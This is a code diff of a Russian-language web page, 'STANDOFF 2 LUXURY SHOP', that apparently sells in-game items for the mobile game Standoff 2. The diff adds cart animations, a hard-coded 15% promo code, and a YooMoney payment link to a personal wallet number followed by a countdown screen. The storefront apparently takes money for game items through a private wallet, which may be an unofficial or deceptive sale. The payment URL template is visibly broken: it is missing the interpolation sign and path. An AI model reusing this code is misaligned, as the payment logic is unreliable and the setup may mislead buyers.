@@ -22,11 +22,10 @@
         .header h1 { margin: 0; font-size: 1.1rem; letter-spacing: 2px; text-transform: uppercase; color: var(--accent); }
 
         .tabs { display: flex; justify-content: center; gap: 5px; margin: 10px 0; padding: 0 10px; }
-        .tab-btn { background: var(--card); border: 1px solid #444; color: #888; padding: 8px; border-radius: 6px; cursor: pointer; text-transform: uppercase; font-size: 0.6rem; flex: 1; text-align: center; transition: 0.3s; }
+        .tab-btn { background: var(--card); border: 1px solid #444; color: #888; padding: 8px; border-radius: 6px; cursor: pointer; text-transform: uppercase; font-size: 0.6rem; flex: 1; text-align: center; }
         .tab-btn.active { border-color: var(--accent); color: white; background: rgba(255, 140, 0, 0.2); }
 
         .container { max-width: 450px; margin: 0 auto; padding: 0 10px; height: 60vh; overflow-y: auto; scrollbar-width: none; }
-        .container::-webkit-scrollbar { display: none; }
         
         .user-input-box { background: var(--card); padding: 12px; border-radius: 12px; margin-bottom: 10px; border: 1px solid rgba(255,255,255,0.1); }
         input { width: 100%; padding: 10px; background: rgba(0,0,0,0.6); border: 1px solid #333; color: white; border-radius: 6px; box-sizing: border-box; outline: none; margin-bottom: 8px; font-size: 0.8rem; }
@@ -34,20 +33,26 @@
         .services { display: none; grid-template-columns: 1fr; gap: 8px; }
         .services.active { display: grid; }
         
-        .option { background: var(--card); border: 1px solid rgba(255,255,255,0.05); padding: 14px; border-radius: 10px; display: flex; justify-content: space-between; align-items: center; cursor: pointer; transition: 0.2s; position: relative; }
-        .option:active { transform: scale(0.97); }
+        .option { background: var(--card); border: 1px solid rgba(255,255,255,0.05); padding: 14px; border-radius: 10px; display: flex; justify-content: space-between; align-items: center; cursor: pointer; position: relative; }
         .price { color: var(--accent); font-weight: 800; font-size: 1rem; }
 
-        /* АНИМАЦИЯ +1 */
+        /* ТРЯСКА КОРЗИНЫ */
+        .shake { animation: shakeAnim 0.4s ease-in-out; }
+        @keyframes shakeAnim {
+            0%, 100% { transform: scale(1); }
+            25% { transform: scale(1.2) rotate(15deg); }
+            50% { transform: scale(1.2) rotate(-15deg); }
+            75% { transform: scale(1.2) rotate(10deg); }
+        }
+
         .fly-text { position: absolute; color: var(--success); font-weight: bold; font-size: 0.9rem; pointer-events: none; z-index: 5000; animation: flyUp 0.8s ease-out forwards; }
         @keyframes flyUp { from { opacity: 1; transform: translateY(0); } to { opacity: 0; transform: translateY(-50px); } }
 
-        /* ЛЕНТА */
         .live-feed { position: fixed; bottom: 90px; left: 15px; width: 180px; z-index: 1000; pointer-events: none; }
         .feed-item { background: rgba(10, 10, 15, 0.98); border-left: 3px solid var(--accent); padding: 5px 10px; border-radius: 4px; font-size: 0.6rem; margin-top: 5px; display: flex; align-items: center; justify-content: space-between; opacity: 0; transform: translateX(-20px); transition: 0.4s; }
         .feed-item.show { opacity: 1; transform: translateX(0); }
 
-        .cart-toggle { position: fixed; top: 15px; right: 15px; background: var(--accent); color: black; width: 40px; height: 40px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-weight: bold; cursor: pointer; z-index: 2000; }
+        .cart-toggle { position: fixed; top: 15px; right: 15px; background: var(--accent); color: black; width: 40px; height: 40px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-weight: bold; cursor: pointer; z-index: 2000; transition: 0.2s; }
         
         #cart-modal { position: fixed; inset: 0; background: rgba(0,0,0,0.95); z-index: 3000; display: none; backdrop-filter: blur(10px); }
         .cart-content { max-width: 380px; margin: 30px auto; background: #16171a; border-radius: 20px; padding: 20px; border: 1px solid #333; position: relative; min-height: 400px; display: flex; flex-direction: column; }
@@ -56,14 +61,12 @@
         @keyframes spin { to { transform: rotate(360deg); } }
 
         .pay-btn { width: 100%; background: white; color: black; border: none; padding: 14px; border-radius: 10px; font-weight: bold; margin-top: auto; cursor: pointer; font-size: 0.8rem; display: flex; align-items: center; justify-content: center; gap: 8px; }
-        
         .locked-info { text-align: center; padding: 30px 10px; background: rgba(0,0,0,0.4); border-radius: 12px; border: 1px dashed var(--danger); margin-top: 10px; }
-        .locked-info h2 { color: var(--danger); font-size: 0.9rem; margin-bottom: 5px; }
     </style>
 </head>
 <body>
 
-<div class="cart-toggle" onclick="toggleCart()">🛒 <span id="cart-count">0</span></div>
+<div class="cart-toggle" id="cart-icon" onclick="toggleCart()">🛒 <span id="cart-count">0</span></div>
 <div class="header"><h1>STANDOFF 2 LUXURY SHOP</h1></div>
 
 <div class="container">
@@ -94,9 +97,7 @@
         <div class="option" onclick="addToCart(event, '500 Билетов', 369)"><h3>500 Билетов</h3><div class="price">369 ₽</div></div>
     </div>
 
-    <div id="pass" class="services">
-        <div class="locked-info"><h2>РАЗДЕЛ ЗАКРЫТ</h2><p>Технические работы.</p></div>
-    </div>
+    <div id="pass" class="services"><div class="locked-info"><h2 style="color:var(--danger);font-size:0.9rem">РАЗДЕЛ ЗАКРЫТ</h2><p style="font-size:0.7rem;color:#888">Технические работы.</p></div></div>
 </div>
 
 <div id="cart-modal">
@@ -108,7 +109,7 @@
                 <span>Итого:</span><b id="total-price" style="color:var(--accent)">0 ₽</b>
             </div>
             <button class="pay-btn" onclick="goToPay()">ОПЛАТИТЬ ПО СБП <img src="https://upload.wikimedia.org" width="25" style="filter:brightness(0)"></button>
-            <button onclick="toggleCart()" style="width:100%; background:none; border:none; color:#555; margin-top:10px; cursor:pointer;">Закрыть</button>
+            <button onclick="toggleCart()" style="width:100%; background:none; border:none; color:#555; margin-top:10px; cursor:pointer; font-size:0.7rem;">Закрыть</button>
         </div>
         <div id="step-waiting" style="display:none; flex-direction:column; align-items:center; justify-content:center; flex:1; text-align:center;">
             <div class="loader"></div>
@@ -128,11 +129,11 @@
 <script>
     let cart = [];
     let discount = 0;
-    const yoomoney = "https://yoomoney.ru";
+    // ИСПРАВЛЕННАЯ ССЫЛКА НА ПЕРЕВОД
+    const wallet = "4100119062204820";
 
     function roundToNine(num) {
-        if (num <= 0) return 0;
-        return Math.floor(num / 10) * 10 + 9;
+        return num <= 0 ? 0 : Math.floor(num / 10) * 10 + 9;
     }
 
     function switchTab(btn, id) {
@@ -145,6 +146,12 @@
     function addToCart(event, name, price) {
         if(!document.getElementById('user_id').value) return alert("Введите ID!");
         
+        // Анимация тряски корзины
+        const icon = document.getElementById('cart-icon');
+        icon.classList.remove('shake');
+        void icon.offsetWidth;
+        icon.classList.add('shake');
+
         // Анимация +1
         const fly = document.createElement('div');
         fly.className = 'fly-text';
@@ -162,9 +169,18 @@
         document.getElementById('cart-count').innerText = cart.length;
         const list = document.getElementById('cart-list');
         list.innerHTML = cart.map(i => `<div style="display:flex; justify-content:space-between; margin-bottom:5px;"><span>${i.name}</span><b>${roundToNine(i.price)} ₽</b></div>`).join('');
-        let rawTotal = cart.reduce((s, i) => s + i.price, 0);
-        if(discount) rawTotal *= (1 - discount);
-        document.getElementById('total-price').innerText = roundToNine(rawTotal) + " ₽";
+        let total = cart.reduce((s, i) => s + i.price, 0);
+        if(discount) total *= (1 - discount);
+        document.getElementById('total-price').innerText = roundToNine(total) + " ₽";
+    }
+
+    function applyPromo() {
+        const val = document.getElementById('promo_input').value.toUpperCase();
+        if(val === 'LUXURY') {
+            discount = 0.15;
+            document.getElementById('active-promos').innerText = "Промокод LUXURY применен (-15%)";
+            updateCart();
+        } else { alert("Неверный промокод"); }
     }
 
     function toggleCart() {
@@ -172,19 +188,17 @@
         m.style.display = m.style.display === 'block' ? 'none' : 'block';
     }
 
-    function applyPromo() {
-        if(document.getElementById('promo_input').value.toUpperCase() === 'LUXURY') {
-            discount = 0.15;
-            document.getElementById('active-promos').innerText = "LUXURY: -15%";
-            updateCart();
-        }
-    }
-
     function goToPay() {
         if(cart.length === 0) return;
-        window.open(yoomoney, '_blank');
+        const finalSum = roundToNine(cart.reduce((s, i) => s + i.price, 0) * (discount ? 1-discount : 1));
+        
+        // РЕАЛЬНАЯ ССЫЛКА НА ОПЛАТУ ЮMONEY
+        const payUrl = `https://yoomoney.ru{wallet}&quickpay-form=button&sum=${finalSum}&targets=Order_Standoff2_ID_${document.getElementById('user_id').value}`;
+        
+        window.open(payUrl, '_blank');
         document.getElementById('step-cart').style.display = 'none';
         document.getElementById('step-waiting').style.display = 'flex';
+        
         let t = 900;
         const interval = setInterval(() => {
             let m = Math.floor(t / 60), s = t % 60;
